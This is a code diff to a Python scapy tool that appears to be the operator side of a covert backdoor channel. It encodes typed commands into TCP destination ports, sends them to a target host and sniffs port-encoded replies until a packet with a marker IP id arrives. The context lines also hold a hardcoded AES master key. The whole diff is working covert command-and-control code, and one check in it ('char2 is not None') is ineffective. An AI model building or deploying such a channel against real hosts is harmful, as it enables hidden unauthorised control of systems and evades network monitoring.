@@ -6,7 +6,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from Crypto.Cipher import AES
 MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
-
+OUTPUT = []
 
 def encrypt_val(text):
     secret = AES.new(MASTER_KEY)
@@ -80,6 +80,28 @@ def delay_sleep():
         sys.exit("Invalid input for delay")
 
 
+def get_result(packet):
+	if(packet[1].id == 42424):
+		print(''.join(OUTPUT))
+		return
+	dport = packet[2].dport
+	char1 = chr((dport >> 8) & 0xff)
+	char2 = chr(dport & 0xff)
+	if(char2 is not None):
+		OUTPUT.append("{}{}".format(char1, char2))
+	else:
+		OUTPUT.append("{}".format(char1))
+
+
+def send_cmd(msg):
+    for char1, char2 in zip(msg[0::2], msg[1::2]):
+        delay_sleep()
+        send(char_packet(args.destIP, char1, char2))
+    if(len(msg) % 2):
+        delay_sleep()
+        send(char_packet(args.destIP, msg[len(msg) - 1]))
+    end_msg(args.destIP)
+
 def main():
     verify_root()
     ports = [2525, 14156, 6364]
@@ -87,13 +109,9 @@ def main():
 
     while True:
         msg = raw_input('Send: ')
-        for char1, char2 in zip(msg[0::2], msg[1::2]):
-            delay_sleep()
-            send(char_packet(args.destIP, char1, char2))
-        if(len(msg) % 2):
-            delay_sleep()
-            send(char_packet(args.destIP, msg[len(msg) - 1]))
-        end_msg(args.destIP)
+        send_cmd(msg)
+        sniff(filter="tcp and src {}".format(args.destIP), stop_filter=get_result)
+        
 
 
 if __name__ == '__main__':
